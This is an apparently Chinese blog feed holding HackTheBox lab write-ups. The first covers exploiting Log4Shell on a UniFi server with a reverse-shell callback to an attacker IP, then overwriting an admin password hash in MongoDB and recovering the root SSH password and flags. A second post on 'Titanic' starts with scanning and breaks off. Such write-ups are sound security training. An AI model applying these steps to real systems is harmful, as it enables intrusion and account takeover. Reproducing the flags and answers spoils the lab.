class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;!doctype<span class="hljs-char escape_">\x20</span>ht</span><br><span class="hljs-string">SF:ml&gt;&lt;html<span class="hljs-char escape_">\x20</span>lang=<span class="hljs-char escape_">\&quot;</span>en<span class="hljs-char escape_">\&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>404<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span>\</span><br><span class="hljs-string">SF:x93<span class="hljs-char escape_">\x20</span>Not<span class="hljs-char escape_">\x20</span>Found&lt;/title&gt;&lt;style<span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>text/css<span class="hljs-char escape_">\&quot;</span>&gt;body<span class="hljs-char escape_">\x20</span>&#123;font-fa</span><br><span class="hljs-string">SF:mily:Tahoma,Arial,sans-serif;&#125;<span class="hljs-char escape_">\x20</span>h1,<span class="hljs-char escape_">\x20</span>h2,<span class="hljs-char escape_">\x20</span>h3,<span class="hljs-char escape_">\x20</span>b<span class="hljs-char escape_">\x20</span>&#123;color:whit</span><br><span class="hljs-string">SF:e;background-color:#525D76;&#125;<span class="hljs-char escape_">\x20</span>h1<span class="hljs-char escape_">\x20</span>&#123;font-size:22px;&#125;<span class="hljs-char escape_">\x20</span>h2<span class="hljs-char escape_">\x20</span>&#123;font-</span><br><span class="hljs-string">SF:size:16px;&#125;<span class="hljs-char escape_">\x20</span>h3<span class="hljs-char escape_">\x20</span>&#123;font-size:14px;&#125;<span class="hljs-char escape_">\x20</span>p<span class="hljs-char escape_">\x20</span>&#123;font-size:12px;&#125;<span class="hljs-char escape_">\x20</span>a\x</span><br><span class="hljs-string">SF:20&#123;color:black;&#125;<span class="hljs-char escape_">\x20</span>\.line<span class="hljs-char escape_">\x20</span>&#123;height:1px;background-color:#525D76;bord</span><br><span class="hljs-string">SF:er:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>404<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span></span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Not<span class="hljs-char escape_">\x20</span>Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-number">24</span>E,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400\x2</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Language:<span class="hljs-char escape_">\x20</span>e</span><br><span class="hljs-string">SF:n<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>435<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>2025<span class="hljs-char escape_">\x20</span>11</span><br><span class="hljs-string">SF::39:24<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;!doctype<span class="hljs-char escape_">\x20</span>html&gt;&lt;html\x2</span><br><span class="hljs-string">SF:0lang=<span class="hljs-char escape_">\&quot;</span>en<span class="hljs-char escape_">\&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x20</span>Bad\</span><br><span class="hljs-string">SF:x20Request&lt;/title&gt;&lt;style<span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>text/css<span class="hljs-char escape_">\&quot;</span>&gt;body<span class="hljs-char escape_">\x20</span>&#123;font-family:Taho</span><br><span class="hljs-string">SF:ma,Arial,sans-serif;&#125;<span class="hljs-char escape_">\x20</span>h1,<span class="hljs-char escape_">\x20</span>h2,<span class="hljs-char escape_">\x20</span>h3,<span class="hljs-char escape_">\x20</span>b<span class="hljs-char escape_">\x20</span>&#123;color:white;backgro</span><br><span class="hljs-string">SF:und-color:#525D76;&#125;<span class="hljs-char escape_">\x20</span>h1<span class="hljs-char escape_">\x20</span>&#123;font-size:22px;&#125;<span class="hljs-char escape_">\x20</span>h2<span class="hljs-char escape_">\x20</span>&#123;font-size:16px</span><br><span class="hljs-string">SF:;&#125;<span class="hljs-char escape_">\x20</span>h3<span class="hljs-char escape_">\x20</span>&#123;font-size:14px;&#125;<span class="hljs-char escape_">\x20</span>p<span class="hljs-char escape_">\x20</span>&#123;font-size:12px;&#125;<span class="hljs-char escape_">\x20</span>a<span class="hljs-char escape_">\x20</span>&#123;color:</span><br><span class="hljs-string">SF:black;&#125;<span class="hljs-char escape_">\x20</span>\.line<span class="hljs-char escape_">\x20</span>&#123;height:1px;background-color:#525D76;border:none;&#125;</span><br><span class="hljs-string">SF:&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x20</span>Bad\x</span><br><span class="hljs-string">SF:20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br><span class="hljs-title class_">Service</span> <span class="hljs-title class_">Info</span>: <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">linux</span>:<span class="hljs-variable">linux_kernel</span><br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">227.57</span> <span class="hljs-variable">seconds</span><br></code></pre></td></tr></table></figure><p>nmap æ‰«</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which are <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> <span class="hljs-literal">four</span> <span class="hljs-built_in">open</span> ports?<br>:<span class="hljs-number">22</span>,<span class="hljs-number">6789</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8443</span><br></code></pre></td></tr></table></figure><h3 id="Task-2-8"><a href="#Task-2-8" class="headerlink" title="Task 2"></a>Task 2</h3><p>è®¿é—® 8080 ç«¯å£ä¼šé‡å®šå‘åˆ° 8443 ï¼Œç„¶å</p><p><img src="https://img.dkdun.cn/v1/2025/12/d632171ab4bebf55.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> title <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> software <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">8443</span>?<br>:UniFi Network<br></code></pre></td></tr></table></figure><h3 id="Task-3-8"><a href="#Task-3-8" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> software <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>?<br>:<span class="hljs-number">6.4</span><span class="hljs-number">.54</span><br></code></pre></td></tr></table></figure><h3 id="Task-4-8"><a href="#Task-4-8" class="headerlink" title="Task 4"></a>Task 4</h3><p>ç›´æ¥æœ UniFi Network 6.4.54 CVE</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> is the <span class="hljs-title class_">CVE</span> <span class="hljs-keyword">for</span> the identified vulnerability?<br><span class="hljs-symbol">:CVE-</span><span class="hljs-number">2021</span><span class="hljs-number">-44228</span><br></code></pre></td></tr></table></figure><h3 id="Task-5-8"><a href="#Task-5-8" class="headerlink" title="Task 5"></a>Task 5</h3><p><a href="https://github.com/puzzlepeaches/Log4jUnifi">CVE-2021-44228</a></p><p><a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi</a></p><p>è®°å¾—æ£€æŸ¥ä¸€ä¸‹ java ç¯å¢ƒï¼ˆå› ä¸ºæˆ‘å°±æ˜¯å¿˜è®°æ£€æŸ¥ Java ç¯å¢ƒç„¶åä¸€ç›´å¤±è´¥ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt update &amp;&amp; apt install openjdk-11-jre maven<br>git <span class="hljs-built_in">clone</span> --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \ &amp;&amp; <span class="hljs-built_in">cd</span> Log4jUnifi &amp;&amp; pip3 install -r requirements.txt<br>mvn package -f utils/rogue-jndi/<br></code></pre></td></tr></table></figure><p>JNDIï¼ˆJava Naming and Directory Interfaceï¼‰æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¾è®¡çš„ APIï¼Œä¸€ç§æ ‡å‡†çš„ Java å‘½åç³»ç»Ÿæ¥å£ã€‚å¦‚æœç¨‹åºå®šä¹‰äº† JNDI ä¸­çš„æ¥å£ï¼Œé‚£ä¹ˆå°±èƒ½é€šè¿‡æ¥å£çš„ API å»è®¿é—®å‘½ä»¤æœåŠ¡å’Œç›®å½•æœåŠ¡ã€‚</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What protocol <span class="hljs-keyword">does</span> JNDI leverage <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> injection?<br>:LDAP<br></code></pre></td></tr></table></figure><h3 id="Task-6-8"><a href="#Task-6-8" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What tool <span class="hljs-built_in">do</span> we use <span class="hljs-built_in">to</span> intercept <span class="hljs-keyword">the</span> traffic, indicating <span class="hljs-keyword">the</span> attack was successful?<br>:tcpdump<br></code></pre></td></tr></table></figure><h3 id="Task-7-8"><a href="#Task-7-8" class="headerlink" title="Task 7"></a>Task 7</h3><p>åå¼¹ shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> exploit.py -u https://<span class="hljs-number">10.129.61.149:8443</span> -i <span class="hljs-number">10.10.16.45</span> -p <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ea65c75788022868.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">What<span class="hljs-built_in"> port </span><span class="hljs-keyword">do</span> we need <span class="hljs-keyword">to</span> inspect intercepted traffic <span class="hljs-keyword">for</span>?<br>:389<br></code></pre></td></tr></table></figure><h3 id="Task-8-5"><a href="#Task-8-5" class="headerlink" title="Task 8"></a>Task 8</h3><p><code>ps -aux</code> æŸ¥çœ‹è¿›ç¨‹ï¼Œæ‰¾åˆ° <code>MongoDB</code> çš„ç«¯å£ <code>27117</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/29ecd50035aef4bf.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What port <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> MongoDB service <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span>?<br>:<span class="hljs-number">27117</span><br></code></pre></td></tr></table></figure><h3 id="Task-9-5"><a href="#Task-9-5" class="headerlink" title="Task 9"></a>Task 9</h3><p>è¿æ¥ <code>MongoDB</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mongo</span> --port <span class="hljs-number">27117</span><br><span class="hljs-comment">#æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</span><br><span class="hljs-attribute">show</span> dbs<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1d53e89ba85b7111.png"></p><p>é»˜è®¤ä¸º <code>ace</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">default</span> <span class="hljs-keyword">database</span> <span class="hljs-type">name</span> <span class="hljs-keyword">for</span> UniFi applications?<br>:ace<br></code></pre></td></tr></table></figure><h3 id="Task-10-3"><a href="#Task-10-3" class="headerlink" title="Task 10"></a>Task 10</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">function</span> we use <span class="hljs-keyword">to</span> enumerate users <span class="hljs-keyword">within</span> the <span class="hljs-keyword">database</span> <span class="hljs-keyword">in</span> MongoDB?<br>:db.<span class="hljs-keyword">admin</span>.find()<br></code></pre></td></tr></table></figure><h3 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">function</span> we use <span class="hljs-keyword">to</span> <span class="hljs-keyword">update</span> users <span class="hljs-keyword">within</span> the <span class="hljs-keyword">database</span> <span class="hljs-keyword">in</span> MongoDB?<br>:db.<span class="hljs-keyword">admin</span>.<span class="hljs-keyword">update</span>()<br></code></pre></td></tr></table></figure><h3 id="Task-12"><a href="#Task-12" class="headerlink" title="Task 12"></a>Task 12</h3><p>æŒ‡å®šç«¯å£å·ç„¶åè¿æ¥æ•°æ®åº“ï¼Œæšä¸¾ç”¨æˆ·ä¿¡æ¯ä»¥ json æ ¼å¼æ‰“å°</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mongo <span class="hljs-comment">--port 27117 ace</span><br>db.<span class="hljs-keyword">admin</span>.find().<span class="hljs-keyword">forEach</span>(printjson);<br></code></pre></td></tr></table></figure><p>éƒ¨åˆ†å†…å®¹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;_id&quot;</span> <span class="hljs-punctuation">:</span> ObjectId(<span class="hljs-string">&quot;61ce278f46e0fb0012d47ee4&quot;</span>)<span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;name&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;administrator&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;email&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;administrator@unified.htb&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;x_shadow&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;time_created&quot;</span> <span class="hljs-punctuation">:</span> NumberLong(<span class="hljs-number">1640900495</span>)<span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;last_site_name&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default&quot;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>ç”¨ hashid æŸ¥åŠ å¯†æ–¹å¼</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">â”Œâ”€â”€</span>(rootã‰¿butt3rf1y)<span class="hljs-operator">-</span>[<span class="hljs-regexp">/HTB/</span><span class="hljs-type">Machine</span><span class="hljs-regexp">/Unified/</span> ]<br><span class="hljs-operator">â””â”€</span># hashid &#x27;<span class="hljs-variable">$6</span><span class="hljs-variable">$Ry6Vdbse</span><span class="hljs-variable">$8</span>enMR5Znxoo.<span class="hljs-type">WfCMd</span><span class="hljs-regexp">/Xk65GwuQEPx1M.QP8/</span>qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#x27;<br><span class="hljs-type">Analyzing</span> &#x27;<span class="hljs-variable">$6</span><span class="hljs-variable">$Ry6Vdbse</span><span class="hljs-variable">$8</span>enMR5Znxoo.<span class="hljs-type">WfCMd</span><span class="hljs-regexp">/Xk65GwuQEPx1M.QP8/</span>qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#x27;<br>[<span class="hljs-operator">+</span>] <span class="hljs-type">SHA</span><span class="hljs-operator">-</span><span class="hljs-number">512</span> <span class="hljs-type">Crypt</span><br></code></pre></td></tr></table></figure><p>ä¸å¥½çˆ†ç ´</p><p>ç”¨ mkpasswd åˆ›å»ºä¸€ä¸ªå¯†ç ï¼Œç„¶åæŠŠ <code>x_shadow</code> ç”¨ <code>db.admin.update()</code> å‘½ä»¤æ›´æ–°åˆ°æ•°æ®åº“å»</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">â””â”€<span class="hljs-meta"># mkpasswd -m sha-512 admin</span><br>$6$FNM7rHlUpwRIziUu$StfsQybKkHHf9zZkIVQKhvmBD6ApJPzViW/C8EYVxFZlUrM8UHKwDYYLypajSW16dzK8gV9oX7IP5fSmeQSp71<br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">db.<span class="hljs-literal">admin</span>.update(&#123;<span class="hljs-string">&quot;_id&quot;</span>:ObjectId(<span class="hljs-string">&quot;61ce278f46e0fb0012d47ee4&quot;</span>)&#125;,&#123;<span class="hljs-variable">$set</span>:&#123;<span class="hljs-string">&quot;x_shadow&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$6</span><span class="hljs-variable">$FNM7rHlUpwRIziUu</span><span class="hljs-variable">$StfsQybKkHHf9zZkIVQKhvmBD6ApJPzViW</span>/C8EYVxFZlUrM8UHKwDYYLypajSW16dzK8gV9oX7IP5fSmeQSp71&quot;</span>&#125;&#125;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>administrator:admin</code> ç™»å½•è¿›å»ï¼Œåœ¨ <code>SETTING/Site/Device Authentication</code> æ‰¾åˆ° ssh çš„å¯†ç  <code>root:NotACrackablePassword4U2022</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/84aed9d92c91868e.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> the root <span class="hljs-keyword">user</span>?<br>:NotACrackablePassword4U2022<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-11"><a href="#Submit-Flag-11" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p><code>/home/michael</code> çš„ user.txt</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:<span class="hljs-number">6</span>ced1a6a89e666c0620cdb10262ba127<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-12"><a href="#Submit-Flag-12" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>ssh è¿è¿›å»å°±æ˜¯ root äº†</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Submit root flag<br>:e<span class="hljs-number">50</span>bc<span class="hljs-number">93</span><span class="hljs-keyword">c</span><span class="hljs-number">75</span>b<span class="hljs-number">634e4</span>b<span class="hljs-number">272</span>d<span class="hljs-number">2</span>f<span class="hljs-number">771</span><span class="hljs-keyword">c</span><span class="hljs-number">33681</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Titanic</title>
    <link href="/2025/03/04/Titanic/"/>
    <url>/2025/03/04/Titanic/</url>
    
    <content type="html"><![CDATA[<p>å¯’å‡èµ›å­£æ‰“çš„æœºå™¨äº†ï¼Œå”‰ï¼Œæ‹–äº†è¿™ä¹ˆä¹…æ‰æƒ³èµ·å‘å‡ºæ¥ï¼ˆå¤ªæ‡’äº†wwwwwï¼‰ï¼Œæ„Ÿè°¢ z3n1thã€SWDDã€n0o0b å¸ˆå‚…ä»¬çš„å¸®åŠ©www</p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmap æ‰«ä¸€ä¸‹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">55</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">20</span>:<span class="hljs-number">15</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">55</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">37</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span><br>Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">12</span>.<span class="hljs-number">58</span> seconds<br><br></code></pre></td></tr></table></figure><p>å¼€æ”¾äº† 80 å’Œ 22</p><h1 id="UserFlag"><a href="#UserFlag" class="headerlink" title="UserFlag"></a>UserFlag</h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://titanic.htb/ -H  &quot;Host:FUZZ.titanic.htb&quot; -fc <span class="hljs-number">301</span><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/]<br>â””â”€# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://titanic.htb/ -H  &quot;Host:FUZZ.titanic.htb&quot; -fc <span class="hljs-number">301</span><br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\<br>       /\ \__/ /\ \__/  __  __  /\ \__/<br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\<br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/<br>         \ \_\   \ \_\  \ \____/  \ \_\<br>          \/_/    \/_/   \/___/    \/_/<br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://titanic.htb/<br> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt<br> :: Header           : Host: FUZZ.titanic.htb<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: Filter           : Response status: <span class="hljs-number">301</span><br>________________________________________________<br><br>dev                     [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">13982</span>, Words: <span class="hljs-number">1107</span>, Lines: <span class="hljs-number">276</span>, Duration: <span class="hljs-number">710</span>ms]<br>:: Progress: [<span class="hljs-number">114441</span>/<span class="hljs-number">114441</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">80</span> req/sec :: Duration: [<span class="hljs-number">0</span>:<span class="hljs-number">20</span>:<span class="hljs-number">50</span>] :: Errors: <span class="hljs-number">0</span> ::<br><br></code></pre></td></tr></table></figure><p>æŠŠ <code>dev.titanic.htb</code> åŠ åˆ° <code>/etc/hosts</code> é‡Œé¢ç„¶åè®¿é—®</p><p><img 